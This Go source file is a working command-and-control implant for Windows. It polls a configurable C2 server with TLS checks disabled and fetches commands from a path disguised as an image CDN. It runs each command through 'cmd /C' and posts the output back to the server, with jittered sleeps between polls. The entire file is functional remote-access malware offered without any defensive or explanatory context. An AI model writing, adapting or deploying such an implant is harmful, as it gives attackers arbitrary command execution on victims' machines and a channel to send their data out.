package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand/v2"
	"net/http"
	"os/exec"
	"time"
)

var baseSleep = 5 * time.Second
var jitterMin = 0.8
var jitterMax = 1.2

func main() {
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
	}

	c2URL := "https://192.168.0.4" // Change This

	for {
		resp, err := client.Get(c2URL + "/cdn/image")
		if err != nil {
			fmt.Println("[-] Failed to fetch task:", err)
			time.Sleep(5 * time.Second)
			continue
		}

		cmdData, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		cmd := string(cmdData)
		if cmd == "none" {
			fmt.Println("[*] No command available")
			time.Sleep(getJitterSleep())
			continue
		}
		fmt.Println("[*] Received command:", cmd)

		output, err := exec.Command("cmd", "/C", cmd).CombinedOutput()
		if err != nil {
			output = append(output, []byte("\n[!] Error: "+err.Error())...)
		}

		res, err := client.Post(c2URL+"/api/logs", "text/plain", bytes.NewReader(output))
		if err != nil {
			fmt.Println("[-] Failed to send result:", err)
		} else {
			res.Body.Close()
		}

		time.Sleep(5 * time.Second)
	}
}

func getJitterSleep() time.Duration {
	factor := jitterMin + rand.Float64()*(jitterMax-jitterMin)
	return time.Duration(float64(baseSleep) * factor)
}
